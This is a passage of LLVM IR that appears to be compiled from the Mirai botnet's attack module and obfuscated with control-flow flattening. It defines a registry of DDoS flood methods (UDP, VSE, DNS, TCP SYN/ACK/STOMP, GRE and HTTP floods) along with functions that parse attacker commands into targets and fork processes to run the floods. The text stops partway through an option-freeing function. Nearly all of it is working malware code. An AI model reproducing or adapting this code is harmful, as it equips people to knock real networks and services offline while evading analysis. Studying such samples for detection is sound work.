; ModuleID = 'host/ir_fla/Demeter.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 1179882478, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1179882478, label %first
    i32 -1396014355, label %17
    i32 -145575474, label %18
    i32 -314372495, label %32
    i32 -276598328, label %33
    i32 1519100439, label %44
    i32 959025648, label %45
    i32 -741188314, label %57
    i32 355505705, label %58
    i32 -2106343815, label %66
    i32 -310182768, label %67
    i32 -1792359761, label %72
    i32 892583554, label %78
    i32 1459113815, label %120
    i32 -317113336, label %123
    i32 2082415155, label %128
    i32 -821155488, label %129
    i32 10881953, label %141
    i32 -1445870595, label %146
    i32 -106254298, label %152
    i32 -1275705959, label %157
    i32 -1810666962, label %158
    i32 -79606303, label %175
    i32 154439948, label %176
    i32 -82659584, label %189
    i32 -393176447, label %190
    i32 465934832, label %219
    i32 149062264, label %222
    i32 -2045479835, label %223
    i32 573108784, label %231
    i32 -1287666624, label %235
    i32 -858593401, label %238
    i32 388491024, label %242
    i32 -1255206034, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 -1396014355, i32 -145575474
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -314372495, i32 -276598328
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 1519100439, i32 959025648
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -741188314, i32 355505705
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 -2106343815, i32 -310182768
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 -1792359761, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 892583554, i32 -317113336
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 1459113815, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 -1792359761, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 2082415155, i32 -821155488
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 10881953, i32 -2045479835
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 -1445870595, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 -106254298, i32 149062264
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 -1275705959, i32 -1810666962
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 -79606303, i32 154439948
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 -82659584, i32 -393176447
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 465934832, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 -1445870595, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -2045479835, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 573108784, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 -1287666624, i32 -858593401
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 -858593401, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 388491024, i32 -1255206034
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 -1255206034, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1890517656, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1890517656, label %first
    i32 1329235456, label %19
    i32 284542840, label %23
    i32 -845838579, label %24
    i32 -1457423417, label %25
    i32 -2073388883, label %31
    i32 -1076537286, label %44
    i32 -1507363789, label %57
    i32 -1362435478, label %58
    i32 -63090550, label %61
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp sgt i32 %.reload, 0
  %18 = select i1 %17, i32 284542840, i32 1329235456
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %13, align 4
  %21 = icmp eq i32 %20, -1
  %22 = select i1 %21, i32 284542840, i32 -845838579
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

; <label>:24:                                     ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  store i32 -1457423417, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %14, align 4
  %27 = load i8, i8* @methods_len, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp slt i32 %26, %28
  %30 = select i1 %29, i32 -2073388883, i32 -63090550
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i32, i32* %14, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %34
  %36 = load %struct.attack_method*, %struct.attack_method** %35, align 8
  %37 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %36, i32 0, i32 1
  %38 = load i8, i8* %37, align 8
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* %8, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %39, %41
  %43 = select i1 %42, i32 -1076537286, i32 -1507363789
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %46 = load i32, i32* %14, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %45, i64 %47
  %49 = load %struct.attack_method*, %struct.attack_method** %48, align 8
  %50 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %49, i32 0, i32 0
  %51 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %50, align 8
  %52 = load i32, i32* %7, align 4
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %55 = load i8, i8* %11, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %51(i32 %52, i8 zeroext %53, %struct.attack_target* %54, i8 zeroext %55, %struct.attack_option* %56)
  store i32 -63090550, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -1362435478, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %14, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %14, align 4
  store i32 -1457423417, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %58, %57, %44, %31, %25, %24, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 1879254358, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1879254358, label %first
    i32 -831874758, label %9
    i32 1588022891, label %10
    i32 1582055655, label %11
    i32 -1242846081, label %16
    i32 181577178, label %25
    i32 1180391123, label %32
    i32 908262060, label %33
    i32 -914986351, label %36
    i32 428853865, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 -831874758, i32 1588022891
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 428853865, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1582055655, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 -1242846081, i32 -914986351
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
